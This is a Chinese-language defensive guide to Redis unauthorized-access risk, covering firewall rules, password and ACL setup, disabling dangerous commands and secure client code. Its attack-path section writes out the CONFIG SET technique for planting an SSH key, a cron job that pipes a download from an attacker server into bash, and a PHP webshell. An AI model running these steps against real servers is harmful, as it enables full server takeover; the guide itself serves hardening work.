# Redis 未授权访问风险

## 元数据
- **tier适用**: L1 ✅ | L2 ✅ | L3 ✅
- **领域**: data
- **严重程度**: critical
- **修复成本**: L1: 免费 | L2: $10-30/月 | L3: 企业方案
- **独立开发者适用度**: ⭐⭐⭐⭐⭐ (5/5)
- **最后验证日期**: 2026-06-11

---

## L1 独立开发者版（速查版）

### 你会遭遇什么（一句话）
你的 Redis 服务器因为没有设置密码且暴露在公网，攻击者可以直接连接并窃取 session、缓存数据，甚至利用 Redis 写入 SSH 公钥或 cron 任务，完全控制你的服务器。

### 一分钟识别
你的产品是否有以下特征：
- [ ] 使用 Redis 作为缓存或 session 存储
- [ ] Redis 部署在云服务器上（非本地开发）
- [ ] **从未设置 requirepass 密码**
- [ ] **Redis 端口 6379 对公网开放**
- [ ] 使用默认配置文件，未修改危险命令
- [ ] Redis 以 root 权限运行
→ 勾选≥2项，尤其是中间两项，**立即行动**

### 一句话防御
在云服务商控制台设置安全组，只允许应用服务器 IP 访问 Redis 端口，并立即在 `redis.conf` 中设置强密码（`requirepass`）。

### 快速行动清单

#### 🔴 立即行动项（今天完成，免费）
1. [ ] **检查暴露状态**：
   ```bash
   # 本地执行，测试能否连接你的 Redis
   redis-cli -h 你的服务器IP -p 6379 PING
   # 如果返回 PONG 且未要求密码 = 已暴露
   ```
   
2. [ ] **设置防火墙规则**：
   - AWS: EC2 → Security Groups → 入站规则 → 只允许应用服务器 IP 访问 6379
   - 阿里云: ECS → 安全组 → 配置规则 → 仅允许应用服务器 IP
   - 腾讯云: CVM → 安全组 → 入站规则 → 仅允许应用服务器 IP

3. [ ] **设置 Redis 密码**：
   ```bash
   # 编辑 redis.conf（通常在 /etc/redis/redis.conf）
   sudo nano /etc/redis/redis.conf
   
   # 找到并修改（取消注释）
   requirepass 你的强密码_至少32位_包含大小写数字符号
   
   # 重启 Redis
   sudo systemctl restart redis
   
   # 验证
   redis-cli -a 你的密码 PING  # 应该返回 PONG
   redis-cli PING  # 应该返回 NOAUTH Authentication required
   ```

#### 🟡 短期行动项（本周完成，免费）
1. [ ] **禁用危险命令**：
   ```bash
   # 在 redis.conf 中添加
   rename-command FLUSHDB ""
   rename-command FLUSHALL ""
   rename-command KEYS ""
   rename-command CONFIG ""
   rename-command DEBUG ""
   ```
   
2. [ ] **修改默认端口**：
   ```bash
   # 在 redis.conf 中修改
   port 16379  # 改为非标准端口
   ```

3. [ ] **限制监听地址**：
   ```bash
   # 在 redis.conf 中修改
   bind 127.0.0.1  # 或内网 IP
   protected-mode yes
   ```

4. [ ] **禁用 root 运行**：
   ```bash
   # 创建 redis 用户
   sudo useradd -r -s /bin/false redis
   # 修改 redis.conf
   sudo sed -i 's/^# *daemonize.*/daemonize yes/' /etc/redis/redis.conf
   ```

#### 🟢 长期行动项（规划中，低成本）
1. [ ] **使用 Redis 托管服务**：AWS ElastiCache、阿里云 Redis 等，默认安全配置
2. [ ] **启用 TLS 加密**：Redis 6+ 支持原生 TLS
3. [ ] **定期审计**：每月检查安全组规则和访问日志

### Redis 安全配置清单

```bash
# /etc/redis/redis.conf 安全配置模板

# 网络安全
bind 127.0.0.1  # 或内网 IP
protected-mode yes
port 16379  # 非标准端口

# 认证
requirepass <使用密码管理器生成的32位强密码>

# 禁用危险命令
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command KEYS ""
rename-command CONFIG ""
rename-command DEBUG ""
rename-command SHUTDOWN ""
rename-command BGREWRITEAOF ""
rename-command BGSAVE ""
rename-command SAVE ""

# 运行权限
user redis
daemonize yes

# 日志
loglevel notice
logfile /var/log/redis/redis-server.log

# 限制最大内存（防止 OOM）
maxmemory 256mb
maxmemory-policy allkeys-lru

# 禁用危险特性
disable-dump-restore true
```

### 防火墙规则配置

**AWS 安全组规则**：
```json
[
  {
    "Description": "Allow Redis from app server",
    "FromPort": 16379,
    "ToPort": 16379,
    "IpProtocol": "tcp",
    "IpRanges": [
      {
        "CidrIp": "10.0.1.100/32",
        "Description": "App server private IP"
      }
    ]
  }
]
```

**iptables 规则**：
```bash
#!/bin/bash
# Redis 防火墙规则

REDIS_PORT=16379
APP_SERVER_IP="10.0.1.100"

# 允许应用服务器访问
iptables -A INPUT -p tcp -s $APP_SERVER_IP --dport $REDIS_PORT -j ACCEPT

# 拒绝其他所有访问
iptables -A INPUT -p tcp --dport $REDIS_PORT -j DROP

# 保存规则
iptables-save > /etc/iptables/rules.v4
```

**UFW 规则（Ubuntu）**：
```bash
# 允许应用服务器 IP
sudo ufw allow from 10.0.1.100 to any port 16379 proto tcp

# 默认拒绝
sudo ufw deny 16379
```

### 推荐工具
- **免费**：
  - [Shodan](https://www.shodan.io/) - 搜索 `port:6379 product:Redis` 检查暴露
  - [Redis Commander](https://github.com/joeferner/redis-commander) - Redis 管理 GUI
  - [RedisInsight](https://redis.com/redis-enterprise/redis-insight/) - 官方可视化工具

- **低成本**：
  - [AWS ElastiCache](https://aws.amazon.com/elasticache/) - $15/月起，自动安全配置
  - [阿里云 Redis](https://www.aliyun.com/product/kvstore) - ¥100/月起
  - [Upstash Redis](https://upstash.com/) - Serverless Redis，按使用付费

### 验证方法
- [ ] **外部验证**：从本地执行 `redis-cli -h 你的IP -p 16379 PING`，应该超时或拒绝连接
- [ ] **Shodan 检查**：搜索你的 IP，Redis 端口不应该显示
- [ ] **无密码测试**：`redis-cli -h localhost -p 16379 PING` 应返回 `NOAUTH`
- [ ] **有密码测试**：`redis-cli -a 你的密码 PING` 应返回 `PONG`

---

## L2 小团队版（理解版）

### 场景还原

**真实案例**：2021年，一位独立开发者使用 Redis 存储用户 session 和 API 缓存。为了方便调试，他在 AWS EC2 上部署了 Redis，**没有设置密码，也没有配置安全组**。

产品上线后 2 小时，攻击者通过 Shodan 扫描到该服务器的 6379 端口开放，直接连接后：
1. 导出所有 session，劫持管理员账户
2. 写入 SSH 公钥到 `/root/.ssh/authorized_keys`
3. 植入 cron 挖矿脚本
4. 删除原始数据，留下勒索信息

**后果**：
- 服务器被完全控制
- 3000+ 用户 session 泄露
- 清理服务器和迁移成本超过 $5000

**类似案例**：
- 2020年，某 SaaS 产品的 Redis 被写入 SSH 公钥，服务器被挖矿
- 2022年，某电商平台的 Redis 被清空，导致 session 失效，用户无法登录

### 攻击路径（简化版）

```
1. 攻击者发现目标
   ├── 使用 Shodan 扫描: port:6379 product:Redis
   ├── 或使用 Masscan 快速扫描全网
   └── 筛选 "NOAUTH" 状态的服务器
   
2. 验证可访问性
   ├── redis-cli -h 目标IP PING
   ├── 返回 PONG = 无认证
   └── INFO 命令查看版本和配置
   
3. 探测数据价值
   ├── KEYS *  # 列出所有 key
   ├── GET session:*  # 导出 session
   ├── CONFIG GET dir  # 查看运行目录
   └── INFO Keyspace  # 查看数据库大小
   
4. 利用 Redis 写入文件
   ├── 方式A：写入 SSH 公钥
   │   CONFIG SET dir /root/.ssh/
   │   CONFIG SET dbfilename authorized_keys
   │   SET x "\n\nssh-rsa AAAA...攻击者公钥\n\n"
   │   SAVE
   │
   ├── 方式B：写入 cron 任务
   │   CONFIG SET dir /var/spool/cron/
   │   CONFIG SET dbfilename root
   │   SET x "\n\n*/1 * * * * curl 攻击者服务器 | bash\n\n"
   │   SAVE
   │
   └── 方式C：写入 webshell
       CONFIG SET dir /var/www/html/
       CONFIG SET dbfilename shell.php
       SET x "<?php system($_GET['cmd']); ?>"
       SAVE
   
5. 完全控制服务器
   ├── SSH 登录（使用写入的公钥）
   ├── 植入挖矿脚本
   ├── 安装后门
   └── 清除日志
```

**关键点**：
- 整个攻击过程 **< 5 分钟**
- **无需任何黑客工具**，仅需 redis-cli
- 攻击自动化脚本公开可用
- Redis 以 root 运行 = 完全控制

### 防御实施（低成本方案）

#### 方案A：免费方案（DIY 配置）

**第一步：配置防火墙**
```bash
#!/bin/bash
# redis-firewall.sh

REDIS_PORT="${REDIS_PORT:-6379}"
APP_SERVER_IP="${APP_SERVER_IP:-10.0.1.100}"

echo "配置 Redis 防火墙规则..."

# 清除旧规则（仅 Redis 相关）
iptables -D INPUT -p tcp --dport 6379 -j ACCEPT 2>/dev/null || true
iptables -D INPUT -p tcp --dport $REDIS_PORT -j ACCEPT 2>/dev/null || true

# 允许应用服务器
iptables -A INPUT -p tcp -s $APP_SERVER_IP --dport $REDIS_PORT -j ACCEPT

# 拒绝其他所有访问
iptables -A INPUT -p tcp --dport $REDIS_PORT -j DROP

# 保存规则
if command -v iptables-save &> /dev/null; then
    iptables-save > /etc/iptables/rules.v4
    echo "✓ 防火墙规则已保存"
fi

echo "✓ 配置完成"
```

**第二步：配置 Redis 认证**
```bash
#!/bin/bash
# redis-auth-setup.sh

REDIS_CONF="${REDIS_CONF:-/etc/redis/redis.conf}"
REDIS_PASSWORD=$(openssl rand -base64 32 | tr -d '/+=' | head -c 32)

echo "配置 Redis 认证..."

# 备份原配置
sudo cp $REDIS_CONF ${REDIS_CONF}.backup.$(date +%Y%m%d)

# 设置密码
if grep -q "^requirepass" $REDIS_CONF; then
    sudo sed -i "s/^requirepass.*/requirepass $REDIS_PASSWORD/" $REDIS_CONF
else
    echo "requirepass $REDIS_PASSWORD" | sudo tee -a $REDIS_CONF > /dev/null
fi

# 启用保护模式
sudo sed -i 's/^protected-mode.*/protected-mode yes/' $REDIS_CONF

# 绑定内网地址
sudo sed -i 's/^bind.*/bind 127.0.0.1/' $REDIS_CONF

# 重启 Redis
sudo systemctl restart redis

echo "✓ Redis 密码: $REDIS_PASSWORD"
echo "⚠️  请保存此密码到密码管理器"
echo ""
echo "连接命令: redis-cli -a $REDIS_PASSWORD"
```

**第三步：禁用危险命令**
```bash
#!/bin/bash
# redis-disable-commands.sh

REDIS_CONF="${REDIS_CONF:-/etc/redis/redis.conf}"

echo "禁用危险命令..."

# 危险命令列表
COMMANDS=(
    "FLUSHDB"
    "FLUSHALL"
    "KEYS"
    "CONFIG"
    "DEBUG"
    "SHUTDOWN"
    "BGREWRITEAOF"
    "BGSAVE"
    "SAVE"
)

# 添加到配置文件
echo "" | sudo tee -a $REDIS_CONF > /dev/null
echo "# 安全配置 - 禁用危险命令" | sudo tee -a $REDIS_CONF > /dev/null

for cmd in "${COMMANDS[@]}"; do
    echo "rename-command $cmd \"\"" | sudo tee -a $REDIS_CONF > /dev/null
done

# 重启 Redis
sudo systemctl restart redis

echo "✓ 危险命令已禁用"
```

#### 方案B：低成本方案（<$30/月）

**工具/服务**：AWS ElastiCache 或 Upstash Redis

**配置步骤（AWS ElastiCache）**：
```bash
# 1. 创建 Redis 集群（AWS Console 或 CLI）

aws elasticache create-replication-group \
  --replication-group-id my-redis-cluster \
  --replication-group-description "Secure Redis for my app" \
  --engine redis \
  --engine-version 7.0 \
  --cache-node-type cache.t3.micro \
  --num-cache-clusters 1 \
  --at-rest-encryption-enabled \
  --transit-encryption-enabled \
  --auth-token your-strong-password-32-chars \
  --cache-parameter-group-name default.redis7

# 2. 安全组配置（只允许应用服务器）
# 在 EC2 控制台配置安全组

# 3. 应用连接字符串
# REDIS_URL=redis://:your-strong-password@my-redis-cluster.xxxxxx.use1.cache.amazonaws.com:6379
```

**Upstash Redis（Serverless）**：
```bash
# 1. 注册 Upstash: https://upstash.com
# 2. 创建 Redis 数据库（免费层：10,000 requests/day）
# 3. 自动生成连接字符串

# 环境变量
UPSTASH_REDIS_REST_URL=https://xxxxxx.upstash.io
UPSTASH_REDIS_REST_TOKEN=your-token

# 代码示例（Node.js）
import { Redis } from '@upstash/redis'

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
})

await redis.set('key', 'value')
const value = await redis.get('key')
```

**成本对比**：

| 指标 | 方案A (DIY) | 方案B (ElastiCache) | 方案B (Upstash) |
|------|------------|---------------------|-----------------|
| 月成本 | $0 | $15-30 | $0-10 |
| 配置时间 | 1-2 小时 | 30 分钟 | 5 分钟 |
| 维护时间 | 1 小时/月 | 0 小时/月 | 0 小时/月 |
| 安全等级 | 依赖配置 | 默认安全 | 默认安全 |
| TLS 加密 | 需配置 | 自动 | 自动 |
| 备份恢复 | 需自建 | 自动快照 | 自动持久化 |

### 决策树

```
你的使用场景？
├── 仅缓存（可丢失）
│   ├── 预算 = $0 → 方案A（DIY）或 Upstash Free
│   └── 预算 > $0 → Upstash Pro ($10/月)
│
├── Session 存储（需持久化）
│   ├── 数据量 < 5GB → Upstash ($0-50/月)
│   └── 数据量 > 5GB → ElastiCache ($30+/月)
│
└── 队列/消息
    ├── 低频率 → Upstash Free
    └── 高频率 → ElastiCache 或自建集群
```

### 代码示例

#### 安全的 Redis 连接管理（Node.js）

```javascript
// lib/redis-client.js
import { createClient } from 'redis'

class RedisManager {
  constructor() {
    this.client = null
    this.isConnected = false
  }

  async connect() {
    const {
      REDIS_HOST,
      REDIS_PORT = 6379,
      REDIS_PASSWORD,
      REDIS_TLS = 'false'
    } = process.env

    if (!REDIS_PASSWORD) {
      throw new Error('REDIS_PASSWORD 环境变量未设置')
    }

    const config = {
      socket: {
        host: REDIS_HOST,
        port: parseInt(REDIS_PORT),
        tls: REDIS_TLS === 'true',
        reconnectStrategy: (retries) => {
          if (retries > 10) {
            console.error('Redis 重连失败，停止重试')
            return new Error('Redis connection failed')
          }
          // 指数退避
          return Math.min(retries * 100, 3000)
        }
      },
      password: REDIS_PASSWORD
    }

    this.client = createClient(config)

    this.client.on('error', (err) => {
      console.error('Redis 错误:', err)
      this.notifyError(err)
    })

    this.client.on('connect', () => {
      console.log('✓ Redis 连接成功')
      this.isConnected = true
    })

    this.client.on('disconnect', () => {
      console.warn('⚠️  Redis 连接断开')
      this.isConnected = false
    })

    await this.client.connect()
    return this.client
  }

  async disconnect() {
    if (this.client) {
      await this.client.quit()
      this.isConnected = false
    }
  }

  // 安全的命令封装
  async safeGet(key) {
    if (!this.isConnected) {
      throw new Error('Redis 未连接')
    }
    return await this.client.get(key)
  }

  async safeSet(key, value, ttlSeconds = 3600) {
    if (!this.isConnected) {
      throw new Error('Redis 未连接')
    }
    return await this.client.set(key, value, { EX: ttlSeconds })
  }

  async safeDel(key) {
    if (!this.isConnected) {
      throw new Error('Redis 未连接')
    }
    return await this.client.del(key)
  }

  // 永远不要使用 KEYS * - 使用 SCAN
  async scanKeys(pattern, count = 100) {
    const keys = []
    let cursor = 0

    do {
      const result = await this.client.scan(cursor, {
        MATCH: pattern,
        COUNT: count
      })
      cursor = result.cursor
      keys.push(...result.keys)
    } while (cursor !== 0)

    return keys
  }

  notifyError(error) {
    // 集成到监控系统
    if (process.env.SLACK_WEBHOOK) {
      fetch(process.env.SLACK_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          text: `🚨 Redis 错误: ${error.message}`
        })
      }).catch(console.error)
    }
  }
}

// 单例模式
const redisManager = new RedisManager()

export default redisManager
```

#### Session 安全存储（Next.js）

```typescript
// lib/session.ts
import { serialize, parse } from 'cookie'
import { SignJWT, jwtVerify } from 'jose'
import redisManager from './redis-client'

const SESSION_SECRET = process.env.SESSION_SECRET!
const COOKIE_NAME = 'session'
const SESSION_TTL = 7 * 24 * 60 * 60 // 7 天

export interface SessionData {
  userId: string
  email: string
  role: string
  createdAt: number
}

export class SessionManager {
  private static getKey(sessionId: string) {
    return `session:${sessionId}`
  }

  static async create(data: Omit<SessionData, 'createdAt'>): Promise<string> {
    const sessionId = crypto.randomUUID()
    const sessionData: SessionData = {
      ...data,
      createdAt: Date.now()
    }

    // 存储到 Redis
    await redisManager.safeSet(
      this.getKey(sessionId),
      JSON.stringify(sessionData),
      SESSION_TTL
    )

    return sessionId
  }

  static async get(sessionId: string): Promise<SessionData | null> {
    const data = await redisManager.safeGet(this.getKey(sessionId))
    if (!data) return null

    try {
      return JSON.parse(data)
    } catch {
      return null
    }
  }

  static async destroy(sessionId: string): Promise<void> {
    await redisManager.safeDel(this.getKey(sessionId))
  }

  static async refresh(sessionId: string): Promise<void> {
    const data = await this.get(sessionId)
    if (data) {
      await redisManager.safeSet(
        this.getKey(sessionId),
        JSON.stringify(data),
        SESSION_TTL
      )
    }
  }

  // 用于 API 路由
  static async getSessionFromRequest(req: Request): Promise<SessionData | null> {
    const cookie = req.headers.get('cookie')
    if (!cookie) return null

    const cookies = parse(cookie)
    const sessionId = cookies[COOKIE_NAME]
    if (!sessionId) return null

    return await this.get(sessionId)
  }
}
```

---

## L3 企业版（深耕版）

本案例的企业级版本详见：
- [企业 Redis 安全案例集](../../enterprise/infosec/redis-security-enterprise.md)
- [Redis 安全最佳实践](../../enterprise/infosec/redis-security-best-practices.md)

### 企业版关键差异

| 维度 | 独立开发者版 | 企业版 |
|------|------------|--------|
| 访问控制 | 单一密码 | ACL + RBAC |
| 加密 | 传输加密（可选） | 传输 + 存储加密（强制） |
| 监控 | 手动检查 | Prometheus + Grafana 实时监控 |
| 审计 | 无 | 命令审计 + 异常检测 |
| 高可用 | 单节点 | 集群 + 哨兵 + 自动故障转移 |
| 合规 | 无要求 | SOC2/PCI-DSS/GDPR |

---

## 附录：常见问题

**Q: Redis 6+ 的 ACL 如何配置？**

A: Redis 6+ 支持细粒度访问控制：
```bash
# 在 redis.conf 中
user app_user on >强密码 ~cached:* +@read +@write -@dangerous
user admin on >admin密码 ~* +@all

# 默认用户禁用
user default off

# 连接时指定用户
redis-cli --user app_user --pass 密码
```

**Q: 如何检测 Redis 是否被攻击？**

A: 检查以下指标：
```bash
# 查看最近执行的命令
redis-cli -a 密码 MONITOR  # 观察 1 分钟

# 查看连接的客户端
redis-cli -a 密码 CLIENT LIST

# 检查异常 key
redis-cli -a 密码 SCAN 0 MATCH "*"

# 查看服务器信息
redis-cli -a 密码 INFO stats
redis-cli -a 密码 INFO commandstats
```

**Q: Redis 数据如何备份？**

A:
```bash
# RDB 快照（默认）
redis-cli -a 密码 BGSAVE

# AOF 日志（更高耐久性）
# 在 redis.conf 中
appendonly yes
appendfsync everysec

# 自动备份脚本
#!/bin/bash
DATE=$(date +%Y%m%d_%H%M%S)
redis-cli -a 密码 BGSAVE
sleep 5
cp /var/lib/redis/dump.rdb /backup/redis-$DATE.rdb
# 上传到 S3
aws s3 cp /backup/redis-$DATE.rdb s3://your-bucket/redis-backup/
```

---

## 参考资源

- [Redis Security Documentation](https://redis.io/docs/management/security/)
- [Redis ACL Configuration](https://redis.io/docs/management/security/acl/)
- [OWASP Redis Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Redis_Security_Cheat_Sheet.html)
- [AWS ElastiCache Security Best Practices](https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/security-best-practices.html)
- [Upstash Redis Documentation](https://docs.upstash.com/redis)
